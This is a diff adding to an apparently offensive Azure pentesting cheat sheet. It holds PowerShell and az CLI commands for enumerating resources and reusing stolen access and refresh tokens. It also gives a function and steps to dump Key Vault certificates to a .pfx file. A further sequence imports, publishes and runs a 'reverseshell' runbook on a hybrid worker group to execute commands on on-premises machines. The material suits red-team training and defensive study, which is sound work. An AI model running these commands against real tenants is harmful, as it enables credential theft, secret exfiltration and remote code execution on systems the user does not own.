+    az find "vm"
+
+    # Find popular commands within the "az vm" command group
+    az find "az vm"
+
+    # Find popular subcommands and parameters for the "az vm list" command
+    az find "az vm list"
+    
+    # List storage accounts
+    az storage account list
+
+    # list keyvaults
+    az keyvault list
+    ```
+    </Tab>
+    <Tab>
+    **Can't** request a token but can use it for AAD Graph or Microsoft Grpah
+    ```powershell copy filename="Powershell"
+    # Use the AAD Graph module
+    Connect-AzureAD -AccountID test@defcorphq@onmicrosoft.com -AadAccessToken eyJ0eXA...
+    ```
+    </Tab>
+</Tabs>
+
+#### KeyVaults
+Get exact actions allowed on a keyvault
+```powershell copy filename="Powershell"
+# Retrieve KeyVault object (specify name or other params if needed)
+$KeyVault = Get-AzKeyVault
+
+# Get current subscription ID
+$SubscriptionID = (Get-AzSubscription).Id
+
+$ResourceGroupName = $KeyVault.ResourceGroupName
+$KeyVaultName     = $KeyVault.VaultName
+
+$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+
+$RequestParams = @{
+  Method  = 'GET'
+  Uri     = $URI
+  Headers = @{
+    'Authorization' = "Bearer $Access_Token"   # Ensure $Access_Token is set before running
+  }
+}
+
+$Permissions = (Invoke-RestMethod @RequestParams).value
+$Permissions | Format-List *
+```
+
+Get Access token for keyvault
+<Tabs items={['Manual using refreshtoken', 'Using JWT Assertion']}>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    $scope         = 'https://vault.azure.net/.default'
+    $refresh_token = $tokens.refresh_token
+    $GrantType     = 'refresh_token'
+
+    $body = @{
+    "client_id"     = $ClientID
+    "scope"         = $Scope
+    "refresh_token" = $refresh_token
+    "grant_type"    = $GrantType
+    }
+    $KeyVaultAccessToken = Invoke-RestMethod  -UseBasicParsing  -Method Post  -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token"  -Body $body
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    $GISAppKeyVaultToken = New-AccessToken -clientCertificate $clientCertificate -tenantID $tenant_id -appID app_id -scope 'https://vault.azure.net/.default'
+    ```
+    </Tab>
+</Tabs>
+<Tabs items={['Az Powershell', 'APIs']}>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # connect with keyvault access token
+    Connect-AzAccount -AccessToken $accesstoken -KeyVaultAccessToken $keyvaultaccesstoken.access_token -AccountId user@targetcorp.onmicrosoft.com
+    Dump the certificates
+
+    # Get the name of the certitficate
+    (Get-AzKeyVaultCertificate -VaultName MyAppvault).Name MyAppCert
+
+    # Extract it
+    $secret = Get-AzKeyVaultSecret -VaultName MyAppvault -Name MyAppCert -AsPlainText
+
+    # Convert it from Base64
+    $secretByte = [Convert]::FromBase64String($secret)
+
+    # Write it to a file
+    [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\GISAppcert.pfx", $secretByte)
+    ```
+    </Tab>
+    <Tab>
+    1. Extract certificate details from keyvault
+    ```powershell copy filename="Powershell"
+    $URI = "https://dataanalyticsappvault.vault.azure.net/certificates?api-version=7.4"
+    $RequestParams = @{
+    Method      = 'GET'
+    Uri         = $URI
+    Headers     = @{
+        'Authorization' = "Bearer $GISAppKeyVaultToken"
+    }
+    ContentType = "application/json"
+    }
+
+    $KVInfo = (Invoke-RestMethod @RequestParams).value
+
+    $KVInfo
+    ```
+   2. powershell function to dump a certificate 
+    ```powershell copy filename="GetAKVCertificate"
+        function Get-AKVCertificate($kvURI, $GISAppKeyVaultToken, $keyName) {
+        
+        # Get all certificates in the Key Vault
+        $uri = "$($kvURI)/certificates?api-version=7.3"
+        $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{
+            'Authorization' = "Bearer $($GISAppKeyVaultToken)"
+        }
+
+        $certs = $httpResponse.Content | ConvertFrom-Json
+
+        # Find the certificate by name
+        $certUri = $certs.value | Where-Object { $_.id -like "*$($keyName)*" }
+        Write-Output $certUri
+
+        # Get details of the specific certificate
+        $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{
+            'Authorization' = "Bearer $($GISAppKeyVaultToken)"
+        }
+
+        return $httpResponse.Content | ConvertFrom-Json
+    }
+    ```
+    3. Dump the certificate
+    ```powershell copy filename="Powershell"
+    $AKVCertificate = Get-AKVCertificate -kvURI 'https://DataAnalyticsAppVault.vault.azure.net' -GISAppKeyVaultToken $GISAppKeyVaultToken -keyName 'DataAnalyticsAppCert'
+    ```
+    </Tab>
+</Tabs>
+#### Storage Accounts
+```powershell copy filename="Powershell"
+# Microburst
+# Look for storage blobs configured with public access
+Invoke-EnumerateAzureBlobs -base mycorp
+
+# We can access the files using their URL/file_name
+# We can use SAS URLs with Storage Explorer
+```
+
+#### Automation Accounts
+```powershell copy filename="Powershell"
+# List automation accounts
+az extension add --upgrade -n automation
+az automation account list'
+
+# Check if the automation account is using a hybrid worker group. Will allow us to execute commands on on-prem machine
+Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
+
+# Import a powershell script into the runbook
+Import-AzAutomationRunbook -Name reverseshell -Path .\reverse-shell.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
+
+# Publish the runbook
+Publish-AzAutomationRunbook -RunbookName reverseshell -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+
+# Start the runbook 
+Start-AzAutomationRunbook -RunbookName reverseshell -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+```
 ### Enumeration Using [ROADTools](https://github.com/dirkjanm/ROADtools)
 ### Enumeration Using [AzureHound](https://github.com/dirkjanm/ROADtools)
 ### Enumeratin Using [StormSpotter](https://github.com/Azure/Stormspotter)
+
+## Playing with Tokens
+<Tabs items={['Az Powershell', 'AzureAD Module', 'TokenTactics', 'New-AccessToken.ps1']}>
+<Tab>
+```powershell copy filename="Powershell"
+# If you're already connected to a tenant. request access token for ARM
+Get-AzAccessToken
+(Get-AzAccessToken).Token
+
+# Use the access token for authentication to ARM
+Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA...
+
+# Add a token for MS Graph to access Azure Entra ID too
+Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA... -MicrosoftGraphAccessToken eyJ0eXA...
+```
+</Tab>
+<Tab>
+</Tab>
+<Tab>
+</Tab>
+<Tab>
+```powershell copy filename="Powershell"
+New-AccessToken to request for token PS C:\AzAD\Tools> New-AccessToken -clientCertificate $clientCertificate -tenantID $tenant_id -appID $app_id -scope 'https://management.azure.com/.default'
+```
+</Tab>
+</Tabs>
+
+## Initial Access
+## Privilege Escalation
+## Lateral Movement
+## Persistence
